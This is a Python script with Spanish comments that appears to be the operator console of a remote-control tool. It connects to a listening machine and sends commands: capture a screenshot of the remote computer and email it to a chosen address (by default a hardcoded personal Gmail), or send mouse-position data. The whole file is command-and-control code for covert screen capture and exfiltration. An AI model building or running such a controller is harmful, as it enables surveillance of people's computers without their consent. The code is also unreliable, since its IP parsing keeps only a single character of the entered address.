import socket
import signal, sys, subprocess
from rich import print

def def_handler(sig, frame):
    print ("\n\n Saliendo....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
try :
    clear = subprocess.run("powershell clear")
except:
    pass

ip =  input("IP\n==> ")
ip = ip.strip("//")[1]
port = int(input("Port\n==> "))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try: 
        s.connect((ip, port))
    except:
        print ("\n\n[red] [[/red][yellow]![/yellow][red]][/red] [green]The Server is not ON[/green]\n\n")
        sys.exit(1)
 #   s.send(("hola server\n").encode("utf-8"))
 #   data = s.recv(1024)
 #   print ("\nMensaje del Servidor:\n\n==> {}\n".format((data.decode("utf-8")).strip()))
    d = s.recv(1024).decode("utf-8")
    print (d)
    print ('''[red]
                    \****__              ____                                              
                |    *****\_      --/ *\-__                                          
                /_          (_    ./ ,/----'                                         
        Art by     \__         (_./  /                                                
        Zud0k4t0     \__           \___----^__                                       
                    _/   _                  \                                      
                |    _/  __/ )\"\ _____         *\                                    
                |\__/   /    ^ ^       \____      )                                   
                \___--"                    \_____ )                                  
                                                "
    [/red]''')
    def menu():
        print ('''
                    [yellow]################[/yellow] MENU [green]@@@@@@@@@@@@@@@[/green]
                                1) Sacar Captura del Ordenador
                                2) Enviar Data (Posicion del Mouse)
                                3) Cerrar la Script
                                4) clear/cls
                                5) Show menu
        ''')
    while True:
 #       data = s.recv(1024).decode("utf-8")
 #       if data:
 #           print (data)
        def try_connection():
            try:
                s.send(b"ihere")
                conection_server = s.recv(1024).decode("utf-8")
                if conection_server:
                    pass
            except:
                print("Hemos perdido Conexion :(")
                sys.exit(1)
        try_connection()
        data_Send = input("~# ")

        # Option Capture Image
        
        if data_Send == "1":
            # Send Number
            try_connection()
            s.send(data_Send.encode("utf-8"))
            # Recived Status Image
            set_image = "patata"
            set_email = "juanmapipa4@gmail.com"
            def menu_image(name_image="patata", email="juanmapipa4@gmail.com"):
                print ('''
                    Menu of Capture Image: 
                        [1] Image Name (default={}):
                        [2] Email   (default={}):
                        [3] Send Data:
                        [4] Menu (show Data):
                        [5] Exit (exit):
                '''.format(name_image, email))
            menu_image()
            while True:
                data_option = input("~(IMAGE)~# ")
                if data_option == "1":
                    # Set Image
                    set_image = input("Name Image:\n==> ")
                elif data_option == "2":
                    # Set Email
                    set_email = input("Email\n==> ")
                elif data_option == "3":
                    try:
                        s.send(b'continue')
                        print (set_image)
                        print (set_email)
                        s.send(set_image.encode("utf-8"))
                        s.send(set_email.encode("utf-8"))
                        reponse_data = s.recv(1024).decode("utf-8")
                        print (reponse_data)
                        break
                    except:
                        print ("Hemos perdido la Conexión :()")
                elif data_option == "4":
                    try:
                        menu_image(set_image, set_email)
                    except:
                        print ("Introduce todos los datos")
                elif data_option == "5":
                    try:
                        s.send(b'exit')
                        break
                    except:
                        print("Hemos perdido la Conexión :(")
                        sys.exit(1)

                else:
                    print ("Enter a number \/0-0\/")
                # Recived Status Image
                #response_Image = s.recv(1024).decode("utf-8")
                #print(response_Image)



        elif data_Send == "2":
            try_connection()
            s.send(data_Send.encode("utf-8"))
            letter_option =  input('''
                            ######################################
                                Options ( a,b,c,d )
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
            \nChoose option\n==> ''')
            s.send(letter_option.encode("utf-8"))

        elif data_Send == "close" or data_Send == "exit" or data_Send == "x" or data_Send == "3":
            s.send(data_Send.encode("utf-8"))
            sys.exit(1)
        elif data_Send == "clear" or data_Send == "cls" or data_Send == "4":
            clear = subprocess.run("powershell clear")

        elif data_Send == "help" or data_Send == "h" or data_Send == "5" or data_Send == "menu":
             menu()
        else:
            print ("[red][[/red][yellow]![/yellow][red]][/red] [cyan]No envies pelotudeces...[/cyan]")
            print (s.getsockname())

        